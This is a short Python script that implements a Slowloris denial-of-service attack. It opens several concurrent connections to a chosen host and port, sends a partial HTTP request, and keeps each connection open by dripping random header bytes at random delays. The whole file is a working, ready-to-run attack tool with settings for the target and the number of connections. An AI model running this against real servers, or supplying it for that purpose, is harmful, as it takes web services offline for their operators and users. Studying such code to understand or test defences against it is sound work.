from argparse import ArgumentParser
import asyncio
from functools import partial
import random
from typing import Callable, Generator

from utils import retry


async def headers(
    random_sleep: Callable[[], float],
) -> Generator[bytes, None, None]:
    yield 'GET /ip HTTP/1.1\r\n'.encode('ascii')
    while True:
        await asyncio.sleep(random_sleep())
        yield random.randbytes(1) + '\r\n'.encode('ascii')


@retry(on=ConnectionRefusedError, retries=3)
async def slow_loris(address, random_sleep=lambda: 1.5):
    print('Connected to server')
    _, server = await asyncio.open_connection(*address)
    async for header in headers(random_sleep):
        print(f'Sending random byte {header}')
        server.write(header)
        await server.drain()


async def main(address, loris_count):
    lorises = [
        asyncio.create_task(
            slow_loris(address, partial(random.gauss, mu=5, sigma=0.5))
        )
        for _ in range(loris_count)
    ]
    await asyncio.gather(*lorises)


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('host', nargs='?', default='127.0.0.1')
    parser.add_argument('-p', dest='port', type=int, default=80)
    parser.add_argument(
        '-N',
        dest='loris_count',
        type=int,
        default=4,
        help='Number of lorises to connect to the server',
    )
    args = parser.parse_args()

    address = (args.host, args.port)
    asyncio.run(main(address, args.loris_count))
